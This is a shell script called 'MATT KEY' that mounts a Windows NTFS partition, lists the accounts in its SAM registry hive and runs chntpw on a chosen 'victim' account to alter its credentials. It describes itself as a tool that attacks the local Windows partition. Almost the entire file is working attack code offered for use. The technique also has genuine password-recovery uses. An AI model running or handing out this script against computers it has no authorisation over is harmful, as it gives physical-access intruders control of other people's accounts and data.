#!/bin/sh
printf '%*s\n' "${COLUMNS:-$(tput cols)}" '' | tr ' ' -
COLUMNS=$(tput cols) 
title="[ MATT KEY ]" 
printf "%*s\n" $(((${#title}+$COLUMNS)/2)) "$title"
printf "\n"
desc="Attacks local Windows partition with Petter N Hagen's chntpw" 
printf "%*s\n" $(((${#desc}+$COLUMNS)/2)) "$desc"
printf '%*s\n' "${COLUMNS:-$(tput cols)}" '' | tr ' ' -
printf "\n"

sudo fdisk -l | grep NTFS
read -p '>Please enter windows partition to mount (e.g. sda2): ' partition

while true; do
    read -p '>Did you want to mount '$partition'? (y/n): ' yn
    case $yn in
        [Yy]* ) break;;
        [Nn]* ) exit;;
        * ) echo ">>> Please answer yes or no.";;
    esac
done


#Mount selected partition
sudo mount /dev/$partition /mnt/
#Enter the SAM directory
cd /mnt/Windows/System32/config
#List users
echo ">Listed below are system users:"
chntpw -l SAM | grep \|
#Modify selected user
read -p '>Select user to modify (e.g. Administrator): ' victim
while true; do
    read -p '>Are you sure you want to modify '$victim'? (y/n): ' yn
    case $yn in
        [Yy]* ) break;;
        [Nn]* ) exit;;
        * ) echo ">>> Please answer yes or no.";;
    esac
done
chntpw -u $victim SAM
#Return to Home Directory
cd ~
#Unmount selected partition
sudo umount /dev/$partition
